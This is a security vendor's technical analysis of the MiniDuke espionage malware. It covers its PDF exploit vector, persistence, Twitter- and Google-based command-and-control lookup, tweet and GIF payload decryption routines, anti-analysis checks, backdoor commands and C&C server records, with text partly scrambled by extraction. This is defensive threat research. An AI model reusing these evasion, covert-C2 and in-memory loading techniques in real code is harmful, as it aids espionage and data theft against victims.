A Closer Look at MiniDukeA Closer Look at MiniDukeAuthors Marius TIVADAR – Team Leader, Malware Research Bíró BALÁZS – Malware Researcher Cristian ISTRATE – Malware Researcher Discovery date: February 27 2013. Date of the first known sample: June 2011. Risk: Document exfiltration.2© 2013 BitdefenderA Closer Look at MiniDukeTable of ContentsTable of Contents 31. Overview 52. The Infection Vector 63. Samples 64. Packer Intelligence 65. Modus Operandi 75.1 Notations 75.2 First installation 75.3 Post-Install Execution 75.4 The Watermark 85.4.1 Data layout (for samples dated 2011) 95.4.2 Data layout (samples in 2012/2013) 105.5 Removing the Watermark 105.5.1 Removal of the watermark through cryptanalysis 115.6 Decrypting the Twitter and Google usernames 115.7 Extraction of the secondary Twitter username 12The Algorithm 125.8Interaction with Twitter 125.8.1 Decoding the Tweets 135.9 Backup mechanism: Google 136. Command and Control 146.1 The Tweets 156.2 The Communication Protocol 166.4 The Encryption Algorithm for .GIF Files 176.5 Missing information 177. Malware Versions 188. Anti-Reverse Techniques 199. Payload: Backdoor 209.1 Samples 209.2 The Loader 209.3 Backdoor commands 203© 2013 BitdefenderA Closer Look at MiniDuke9.4 Servers 2110. Payload: Turkish Backdoor 2210.1 Sample 2210.2 Modus Operandi 22Appendix A: Process Blacklist 24Appendix B: Possible channels used for C&C 24Appendix C: Possible MD5 hashes for payloads 25Appendix D: E-Mail samples used in attacks 26Appendix E: Twitter accounts 27Appendix F: Forged documents 29Appendix G: Samples by Year 34Table of Figures Figure 1: Infection mechanism 5 Figure 2: The watermarking process 9 Figure 3: The e-mail bundled with the infected PDF file 264© 2013 BitdefenderA Closer Look at MiniDuke1. OverviewThis piece of malware is made of three components: pdf, main, payload. The PDF file embeds exploit code and a dropper that writes the “main” DLL component on the drive. Additionally, the original PDF also contains a clean PDF file used in the social engineering stage.Figure 1: Infection mechanismAs the malicious PDF file is opened, the Adobe process gets exploited, which results in running the dropper. In turn, upon the dropper’s execution, the host process is killed and the clean PDF file gets displayed. This trick allows the malware to run inconspicuously, without the user noticing that something has happened in the background. The main DLL file is also loaded and runs in installation mode (see the First Installation section ↓). Once installed, the malware calls back home using a URL found via Twitter or Google search query. When successfully connected, new updates or payloads are installed under the disguise of .gif images. There may be other infection mechanisms other than PDF files, but they remain unknown at the moment.5© 2013 BitdefenderA Closer Look at MiniDuke2. The Infection VectorUntil now, we have only found spreading mechanisms that use social engineering via malicious PDF files sent over e-mail (see Appendix F: Forged documents↓). The (Appendix D: E-Mail samples used in attacks↓) section shows such a sample isolated from a real-life attack. The following exploits have been used to trigger the infection: CVE-2011-2462 CVE-2013-0640 The infection vector for the samples dated 2011 is unknown.3. SamplesThe list of known samples is available in the Samples by Year Appendix ↓.4. Packer IntelligenceThe file contains four or five sections with standard names such as: .text, .data, .reloc, .edata, .rdata. The packer code is relatively small (< 1024 bytes). It is encrypted and located in the .text section. The packer is used to decrypt the main code located in the largest section - usually .data or .rdata. The DLL file only exports one function with a random name. Code = <buffer of the encrypted code> length = len(Code) i = length for b in Code:v = ROL(b, i) length; <store decrypted value (v)> i = i - 1;6© 2013 BitdefenderA Closer Look at MiniDuke5. Modus Operandi5.1 Notations SHA1 : SHA1 (probably modified) area1 : a 16-byte zone in the malicious file which holds the query string for Google. area2 : a 128-byte zone in the malicious file which holds the encrypted Twitter link.5.2 First installation This is the case when the malware is started by the dropper. The malware awaits for the user to interact with the computer and verifies the input from mouse or keyboard in an endless loop. In the first step, the watermark is applied, as described in the Watermark ↓ section. After the watermark is applied, the malware re-computes the file’s checksum by using the The file is dropped with a name randomly chosen from a list in the %ALLUSERSPROFILE%\ Application Data folder set to automatically start after reboot as described below:samplesin 2011/2012:for in Software\Microsoft\Windows NT\CurrentVersion\Winlogon. The key holds an environment variable which is set to “rundll32.exe <path_to_dll>, <export_name>”.the malware modifiesthe Shell keyfor samples collected in 2013: the malware adds a .lnk file to the Startup directory, which would execute the dll using rundll32.exe.If there is already a variant of the malware installed before the copy process, the new malware deletes it and creates another combination of names, as well as a new environment variable or .lnk file.5.3 Post-Install Execution In this stage, the malicious binary checks if the image is rundll32 - and therefore if it is run on the system through the .lnk file set in the Startup folder or if it is run from the environment variable. Then, a thread is created in which the OpenInputDesktop() function is called in an endless loop with a sleep interval of 5 seconds. The malware then waits for user interaction by checking input from the mouse or keyboard. The binary also checks the current date, but only uses the current week of the month, the current month and year. The sample from 2011 checks for the current date using url bin/timer.pl The sample from 2012 checks server.org/gettime.php?country=Chinathe current date using url© 2013 BitdefenderA Closer Look at MiniDukeThe samples compiled in 2013 get the current date from the operating system. The malware then removes the watermark, decrypts the data section and attempts to access the Twitter and Google accounts. When either of the sites respond, it interprets the received data and decodes the tweets. When the tweet is decoded, the malware connects to the command and control server in the message and send information about the infected system. The malware then awaits for a response from the command and control center, which comes as an encrypted GIF file. Upon decryption, the malware extracts the embedded payload and runs it. The payload is often an update. After the task has completed, the malware stops. Its execution only lasts until it manages to connect to a Twitter account, then it exits, in order to increase its chances of staying undetected. However, it still runs for a little while upon every operating system boot. The analysis we carried inside the lab reveals that the payloads are not persistent on disk. We presume that they are downloaded from a specific location whenever the system boots up.5.4 The Watermark When the malware is ran via rundll32.exe upon the first boot, it creates a copy of itself named as tempfile.dat (in some samples) and would mark the executable file in order to prevent it from correctly running on other systems. This watermarking process involves the modification of two already encrypted data areas at the end of the executable file. The first encrypted area is 0x80 bytes large and holds the encrypted Twitter link. For samples dated 2011, this area starts with encrypted(url For encrypted(url© 2013 BitdefenderA Closer Look at MiniDukeFigure 2: The watermarking processThe switch to mobile.twitter has been done on purpose in order to keep the data traffic to a minimum when a connection with Twitter is made. Also worth mentioning is the fact that the variants we discovered as dated 2012/2013 are connecting via HTTPS. The second area is 0x10 bytes long and holds an encrypted string that is used to perform a Google query for samples from 2012/2013. Depending on the string and the current date, a second Twitter handle is generated. The sample dated 2011 does not feature this Google The data areas don’t start at a specific offset. In order to find them, the malware iterates them from their end and looks for the first byte that is not zero. This would be the last byte from the small area (which is 0x10 bytes large). From here on, it can compute where the larger data area is located in the file. After the malware has identified the area offsets, it would start encrypting them. A hash is also computed on specific pieces of system information and will be used in the encryption process.5.4.1 Data layout (for samples dated 2011) The malware enumerates every network interface, isolates the first DWORD in the description and writes it to the buffer. for (i = 0; i < interfaces.count; i++) }Buff[i] = *(DWORD*)interfaces[i].bDescription;9© 2013 BitdefenderA Closer Look at MiniDukeThe result is overwritten to the previously collected data. This behavior is probably triggered by a bug.DWORD dwSerialNumber; // found with a GetVolumeInformation call DWORD dwCPUID; // found with the CPUID instruction char ComputerName[MAX_COMPUTER_NAME_LENGTH + 1];5.4.2 Data layout (samples in 2012/2013) typedef struct COMPUTER_INFO The data is padded with zeros in order to achieve a block of 0x40 bytes. A SHA-1 hash is then computed on these bytes, which is then used to modify the small data area (area1). *((DWORD*) area1) ^= *((DWORD*) hash); *((DWORD*) area1 + 4) ^= *((DWORD*) hash + 4); *((DWORD*) area1 + 8) ^= *((DWORD*) hash + 8); *((DWORD*) area1 + 0xC) ^= *((DWORD*) hash + 0xC); For the large data area (which is 0x80 bytes long), the malware does not use the same hash for encryption. Instead, it would interchange the first DWORD with the second one in the structure and would re-compute the SHA-1 hash. for (i=0;i<8;i++) After these operations have completed, a new checksum on the file is computed via the CheckSumMappedFile() function.*((DWORD*) area2 + i) ^= *((DWORD*) hash); *((DWORD*) area2 + i*4) ^= *((DWORD*) hash + 4); *((DWORD*) area2 + i*8) ^= *((DWORD*) hash + 8); *((DWORD*) area2 + i*0xC) ^= *((DWORD*) hash + 0x10);5.5 Removing the Watermark When the malware is run automatically (through rundll.exe), the watermark is removed. The malware re-computes the hash based on the information collected from the system and would perform a XOR operation with the keys computed on the data sections as described in the Watermark ↑ section. When these operations have completed, the sample loaded in memory would not feature the watermark and the data can be decrypted.10© 2013 BitdefenderA Closer Look at MiniDukeIn order to deter analysis and avoid identification in automated malware research systems, the malware iterates through processes and looks for potentially dangerous processes listed in the Appendix A: Process Blacklist ↓ section. If it finds a blacklisted process, the malware modifies the first DWORD in the structure to be hashed in order to ensure that the data cannot be correctly decrypted.5.5.1 Removal of the watermark through cryptanalysis As we discussed in the previous paragraphs, we know that the full Twitter link used by this specific sample is located in the second data section. Upon decryption, the buffer should start with http(s)://(mobile|m)twitter.com which means that we could find out the encryption key used for watermarking, as the encryption algorithm is a constant, just like the encrypted data. We can find all the 16 bytes, since the plain-text is over 16 bytes long. As soon as we had the key, we could completely decrypt the full link, including the Twitter username. For the first data section - where the Google hyperlink is stored - cryptanalysis cannot be performed as we don’t have a prefix of the encrypted text. More than that, the length of the encrypted data is exactly the same as the length of the key.5.6 Decrypting the Twitter and Google usernames The process starts with removing the watermark, as described in the Removing the Watermark ↑ section. At this point, we can isolate the data, although it is encrypted. We proceed then with decrypting the 16-byte section that holds the Google username. The decryption key is obtained by computing the CRC on the unpacked code. The code starts at offset 0xC and spans until the beginning of the data section (which is 0x80 code_crc = crc32(code_begin, code_end); for (i=3; i>=0; i--) Going further, the large area is decrypted with the following algorithm: unsigned char c = 0; for (i=0; i<0x40; i++) {*((DWORD*)area1 + i*sizeof(DWORD)) ^= code_crc; code_crc = ROR(code_crc, 8);c = c - 1;11© 2013 BitdefenderA Closer Look at MiniDukebreak;area2[i] = (ROL(area2[i], c) - c ) ^ c; if (area2[i] == '\0') The result holds the Twitter link with the username.5.7 Extraction of the secondary Twitter username If the primary Twitter username can’t be accessed or if there is an error while contacting the C&C server mentioned in the first tweet, the malware will attempt the same operation with the secondary Twitter account. This secondary account is derived from the Google ID (which is hardcoded into the sample) and the current date (current week). This means that a different ID should come up every week.The Algorithm The malware gets the current date, but only keeps the week of the month, month and year. These pieces of data are then concatenated with the decrypted data in the first data section. A SHA-1 hash is computed on a buffer that has the following structure: Date|GoogleSearchTerm. The hash is then converted to Base64 and isolates the first N bytes of the buffer, which are N = (*(DWORD*) base64_string % mod_val) + add_val; // (mod_val, add_val) are // (8, 6) for samples dated 2011 // (6, 7) for samples dated 2012/2013 Special characters are then stripped from the resulting string. Character ’+’ becomes ’a’, and character ’/’ becomes ’9’.Interaction with Twitter5.8 The malware variant dated 2011 connects to twitter.com, while the variants isolated in 2012/2013 use mobile.twitter.com instead. Every sample comes hardcoded with a version number in the form of a string. Every version uses a different Twitter username. These are the Twitter accounts extracted from samples throughout the years:12© 2013 BitdefenderA Closer Look at MiniDuke2011 uri!wp07VkkxYt3Ag/bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA== After decryption, the tweets would become URLs to update servers.followingtweetsareencodedinthereturn ((val >> pos) & 0xff) | ((val << (8-poz)) & 0xff)5.8.1 Decoding the Tweets The buffers are decoded using Base64, then rotates the output to the right (ROR) with a variable number of bytes, and then 0x5A is subtracted. The encoding is fairly easy by reversing the algorithm. def ror(val,pos): crypt = base64.b64decode(din) for x in crypt: // “dout” holds the decoded string // "din" is the initially-encrypted string.dout = dout + chr((ror(ord(x), c) - 0x5A) & 0xff) c = (c + 1) % 85.9 Backup mechanism: Google If there are connectivity issues while accessing Twitter or if no tweets holding a uri! command are found, the malware falls back to an alternate backup mechanism. A search query with a13© 2013 BitdefenderA Closer Look at MiniDukeseries of characters is sent to Google. The results are then processed until an “uri!” pattern is Although it has been implemented, this mechanism has not been used in the wild. A Google search for these sequences did not yield any results. Most likely, the mechanism has been implemented either for possible victims who had access to Twitter blocked in the firewall or as a failsafe mechanism, should the Twitter accounts get suspended. Also worth mentioning is the fact that the publication of any technical papers about MiniDuke with mentions to the uri! command and these unique sequences would also activate this mechanism. If an infected system is unable to connect to Twitter anymore, it would still be able to call back home, as the Google query would return the C&C address in these technical papers.6. Command and ControlEach Twitter username is associated with as many command and control centers as tweets. The tweets are encoded as described in the Decoding the Tweets ↑ section. After the C&C address is decoded, the malware concatenates it with index.php or main.htm, default.htm, home.htm etc. See the Appendix B: Possible channels used for C&C section ↓. ObamaApril ↔ url etoursinfo ↔ url© 2013 BitdefenderA Closer Look at MiniDuke2012 RuthHarper14 ↔ url trulrich ↔ url zokath ↔ url EdithAlbert11 ↔ url FontenotHoward ↔ url TinaPena10 ↔ url LorindaRay1 ↔ url In the case of Twitter usernames JennieCartagena and CurtinDiana, there are no details about the C&Cs, as these accounts had been suspended and no information was cached by Google.6.1 The Tweets The Twitter accounts and their corresponding messages are listed in the Appendix E: Twitter accounts section↓, along with their timestamp - the date in which action was taken by the The language of these tweets is particular for non-native English speakers - indefinite articles are missing, but the definite ones are present. This is a feature particular to a small number of relatively popular languages that are spoken in Indonesia or Middle East. uri!wp07VkkxYt3Ag/bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA== uri!wp07VkkxYmHJnTtmuxrvY8ST8m6It3LjiYEnZvz4Yl/JezdMPBkw5IiVC1al. I was appointed to a new job, my ID for CV was wrong uri!wp07VkkxYt3Md/JOnLhzRL2FJv0N9zJnzRNp uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GLeyZEDTKU=15© 2013 BitdefenderA Closer Look at MiniDukezokath uri!wp07VkkxYujRoyJ23DkwZ8mRGx6M9yLeyY8m/Yw48GS/E2k= Albert, my cousin. He is working hard. uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GJow39HbphL My native town was ruined by tornado. uri!wp07VkkxYt3Md/JOnLhzRL2FJjY8l2It alas I met new boy uri!wp07VkkxYt3Md/JOnLhzRL2FJm7Mt7DEWg== The weather is good today. Sunny! uri!wp07VkkxYt3Mne5uiDkz4Il/Iw48Ge/EWg==6.2 The Communication Protocol The malware performs a GET request to a server with a Base64-encoded string that, if decoded, reads the following: For 2011 samples: OS major, minor, sp_major, prod_type, architecture(32/64bit) version (the version of the malicious sample) All values are split with ”|”. The entire string is encoded in Base64. For 2012/2013 samples: These samples send additional data, such as the system username. Another significant change is the fact that the malware encodes the text using XOR and a key that results from SHA-1 hashing of the Google identifier. The resulting buffer is then encoded with Base64. This is a practical example of the GET request: ?a=MjIzMTQyMzkzM3xST3xIT01FL0hPTUV8NXwxfDN8MXwwfC18LXwyLjEy&g=MjIzMTQy The variables names in the GET requests are randomly-picked. The second variable holds a CRC modulo 13D455h on the encoded string. The server responds with a GIF file that holds either a DLL or an EXE file.16© 2013 BitdefenderA Closer Look at MiniDuke6.3 Adding Modules and Updates After a request is sent to the C2, the malware receives a file with a .GIF header. This is usually a valid image that has appended to it a payload or an update in an encrypted form. The malware checks for the ‘GIF8’ magic at the beginning of the file and looks for the 0x3b00 word. If the pattern is found, the malware isolates the next four bytes that actually represent the decryption key, followed by the encrypted payload. Next, the digital signature is verified and then the payload is decrypted. If it is a DLL file, it attempts to load it via LoadLibrary(); if it is an EXE file, it gets written on disk with one of the following names: winupdt.exe, wcsntfy.exe, netmngr.exe, dumpreport.exe, taskhosts.exe, wupdmngr.exe, winhlp.exe, dllhosts.exe, dxdiagupd.exe, dialers.exe, netschd.exe, connwiz.exe, certupdt.exe, repfault.exe, wuapreport.exe, lanmgr.exe. The file is then executed. The GIF file is digitally signed with RSA 2048bit. The signature is located at the end of the GIF file and uses SHA-1. This mechanism ensures that the updates are “legit” and prevents an outsider from pushing a fake update.6.4 The Encryption Algorithm for .GIF Files The encryption algorithm for these GIF files is a simple XOR operation with a key that rotates on each step // the .gif file buf = read_file( ) // looking for the index where the pattern starts i = idx_find_pattern() // decrypting the data, the last 0x100 bytes don’t belong to the payload for j in range(i,size - 0x100):decrypt = decrypt + chr(ord(buf[j]) ^ (key & 0xff)) key = rold(key, 4)6.5 Missing information The C&C located at url holds a list that resembles log files. There are approximately 60 entries which we believe are information about the Since we know the form of the data sent over to Command and Control centers, we might be able to get the format for the logs. The format is <CRC>|base64|<size>|<md5>. The CRC is a decimal representation, while the <size> field can represent the size of a payload sent to the respective target. The <md5> - value may be the MD5 hash of the payload.17© 2013 BitdefenderA Closer Look at MiniDukeExample 25479421 84| 4mBwdmBzEaXtEGJSE10Z4mgVEuNV4mBXECt7 gwtgf7EgGBbaHbAs7B7G7Bt0FnlFk17Z 4hTuk1bZ4Ct EiHEU9wEsIoFLgW7mjh3pjCNLfhEuIHzViHbRJwTrk1cS4G3Z4mFS4GAS4mAt4hTtE1PueGPVeF== |0 |024194643 63| EucSE6XtEGASE10Z4mFteGFWE14W4wt7gwt1GVzG7gTrgB4sF Vxegv74 d7 01k1IZ4hTtk1bZ4htbgV7 gcBz5f14 UcBbSj2nWih3vJUA Vdm3ZdhTUdmB Uk1cVdmBT dmcT4GbZ4GBY4mcY4mN= |150948 |c026fbffeed6155b f1 86abedb8681257If the two fields at the end are really representations for <size> and md5, then we may have 24 different binary files (see the Appendix C: Possible MD5 hashes for payloads section ↓). No files in the list could be found by their corresponding MD5.7. Malware VersionsEach sample of the malware comes with a version number hardcoded in the binary. Different versions are usually linked to a different Twitter account. The vast number of versions indicates intense activity, but only a limited number of samples are known. The timestamp is isolated from the sample’s PE header and represents the moment in which the executable file has been linked. Although it can be usually spoofed, we believe it is real, as we were able to correlate it with the moment we received each of the samples. 2011/06/20 - 0.1 - ObamaApril 2011/10/13 - 2.12 – etoursinfo For the 2011 timeframe, we have two samples. The one linked with the ObamaApril Twitter handle - malware version 0.1 - appears to be the oldest sample. The jump to version 2.12 cannot be justified, and we believe that there are a number of missing samples, which makes year 2011 one of the most active periods for this family of malware. However, one could also speculate that the versions do not follow a strict order. 2012/05/14 - 6.66 - trulrich 2012/05/21 - 5.21 - trulrich 2012/05/23 - 6.67 - zokath 2012/06/06 - 6.06 - tonyafordy 2012/09/04 - 0.49 - CurtinDiana 2012/12/26 - 3.13 - RuthHarper14 For year 2012, there are a number of different versions, although we don’t know if they follow a strict order or not. For instance, version 3.13 was released in December, while version 5.21 was spotted in May. It is possible that the servers hosting the samples to have run out of sync. This would explain why lower versions have shown up in December.18© 2013 BitdefenderA Closer Look at MiniDuke2013 2013/02/12 - 1.05 - TinaPena10 2013/02/20 - 1.10 - LorindaRay1 2013/02/20 - 1.12 - EdithAlbert11 2013/02/20 - 1.13 - FontenotHoward 2013/02/21 - 1.10 - LorindaRay1 2013/02/21 - 1.12 - EdithAlbert11 2013/02/21 - 1.13 - FontenotHoward 2013/02/21 - 1.16 - JennieCartagena 2013/02/26 - 1.20 - KellyPalmer20 The versions released in 2013 follow a much stricter order. Every subversion of the malware comes with a separate Twitter handle. Quick math shows that there are at least 20 Twitter accounts that have been used in the attacks throughout 2013 (or at least until February 26th, the date of the discovery).8. Anti-Reverse TechniquesThe first defense mechanism to prevent analysis is the presence of the watermark. The binary file won’t properly run on a different machine, since the data inside the malware would be Other techniques to prevent data decryption are present inside the binary: Running software used for reverse engineering: OllyDbg, IDA, Process Monitor etc.  Running the binary in virtual machines: VMWare and VirtualBox.  Breakpoints added to the code or code alteration (hardware breakpoints need to beused instead).The malware also monitors for signs of user interaction, a common technique used for anti- emulation and anti-automated malware analysis. Another important aspect for versions in 2012 and 2013 is the fact that the malware does not trigger right after installation, but rather wait for a system restart to execute its main code.19© 2013 BitdefenderA Closer Look at MiniDuke9. Payload: Backdoor9.1 Samples These are the MD5 hashes for the droppers. The date is collected from the PE file header of the backdoor in the droppers: The loader decodes the information in the .data section with the UCL algorithm, then passes control to the decrypted code. This piece of code holds a small loader stub, followed by an executable file which is the backdoor itself. The stub overwrites the memory image of the original executable file with the backdoor so it is never written on disk. The malware also creates the following key in the Registry HKCU\Software\Microsoft\ApplicationManager with a value of AppID = <random> (the value is generated via the GetTickCount() function). Malware then waits in a loop and performs requests to info.leveldelta.com Example: GET /php/text.php?i=gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj Accept: */* User-Agent: Mozilla/4.0 Host: info.leveldelta.comThe base64 value in the request is a 30-byte buffer derived from AppID and GetTickCount() and is always different. We believe that it is used as an identifier. If it gets a response from the server, the malware performs a series of validations and execute the received commands. The responses are sent via POST and contain the identifier from the GET request, followed by the command’s result. This is the way the malware exfiltrates documents from the target computers.9.3 Backdoor commands mv - Moves a file. Uses MoveFileA api. cp - Copies a file. Uses CopyFileA api. rm - Deletes a file. Uses DeleteFileA api. pwd - Gets current dir. Uses GetCurrentDirectoryA api. cd - Sets current dir. Uses SetCurrentDirectoryA api. rmdir - Removes dir. Uses RemoveDirectoryA api. mkdir - Creates a dir. Uses CreateDirectoryA api. pskill - Kills process. Uses OpenProcess, TerminateProcess apis.20© 2013 BitdefenderA Closer Look at MiniDukeexew - Create a process. Uses CreateProcessA api. conf - Gets some configuration data, creates a string "id: 0x%08X\char` host: info.leveldelta.com\ cdt - Change to TEMP dir. Uses GetTempPathA, SetCurrentDirectoryA APIs. dev - Returns the list of drives in the system with their type (fixed, removable, etc). The following strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und. Uses GetLogicalDriveStringsA, GetDriveTypeA apis. time - Gets the number of hours since the system was started: "uptime %5d.%02dh”. Uses GetTickCount api. info - Gets info about system. String generated like: "%d %s\n%s\ %s\" using GetCurrentProcessId, GetModuleFileNameA, GetComputerNameA, GetUserNameA dir, ls - List files in current dir. Uses FindFirstFile("*"), FindNextFile apis. exeu - CreateProcessWithLogonW and reads data from pipe. ecec - CreateProcessA and read data from pipe. put - Writes file on disk from internal buffer. Uses CreateFileA, WriteFile apis. get - Reads a file in chunks of 0x400 bytes and computes SHA1 on them. ps, pslist - Gets info about processes and their modules. Uses EnumProcesses, OpenProcess, EnumProcessModules, GetModuleFileNameExA apis.9.4 Servers We have identified two servers used in the attack (sample md5/timestamp/server): Whois information on news.grouptumbler.com Tim K. Lappin () 4573 Froe Street Bluefield, WV 24701 Bluefield, WV 24701 US 4573 Froe Street Bluefield, WV 24701 Bluefield, WV 24701 Whois information on info.leveldelta.com Abdul Kasim ()21© 2013 BitdefenderA Closer Look at MiniDukeFax: 1442 Sokak No 49 Izmir, IZMIR 35432 TR 1442 Sokak No 49 Izmir, IZMIR 35432 TR10. Payload: Turkish Backdoor10.1 Sample Observations: clean code, generated by the compiler and no obfuscation. The file does not have version information or digital signature.10.2 Modus Operandi The malware checks to see if the host computer connects to the Internet through a proxy server. If set, the malware uses the proxy settings. Regardless of the connection method, the It creates an unique identifier (DWORD size), from the socket handle. Everything is encrypted with XOR and a value of an address on the stack. It sends the identifier on the opened socket. It receives 16 bytes from the socket, and creates a MD5 hash on these. The MD5 hash will be used as key for the AES algorithm. It receives 16 bytes used for AES encryption as initialization vector. It receives 4 bytes, it performs a XOR operation with the identifier and allocates memory as follows: malloc(val XOR user_id) It receives a number of size bytes, decrypts them with AES and calls the start of the decrypted The payload can be used to load new modules. The received code needs to be completely relocatable as the main piece of malware. Using this technique, the attackers may introduce malicious code that will never be saved on disk, but rather executed directly from memory. We could also presume that some payloads have been exclusively delivered via this channel Location: Turkey Izmir Inetmar Internet Hizmetleri San. Tic. Ltd. Sti ASN: AS49467 INETMAR INETMAR Internet Hizmetleri Autonomous System (izmir) (registered Jun 15, 2009) Contact: person: Deniz Tosun org: ORG-IiHS1-RIPE address: 1370 sok. NO:42 Yalay Is Merkezi Kat:4/406 address: Montro/Konak/IZMIR Country: TR23© 2013 BitdefenderA Closer Look at MiniDukeAppendix A: Process Blacklist vmwareuser.exeAppendix B: Possible channels used for C&C details.htm24© 2013 BitdefenderA Closer Look at MiniDukesearch.htm article.htmAppendix C: Possible MD5 hashes for payloads 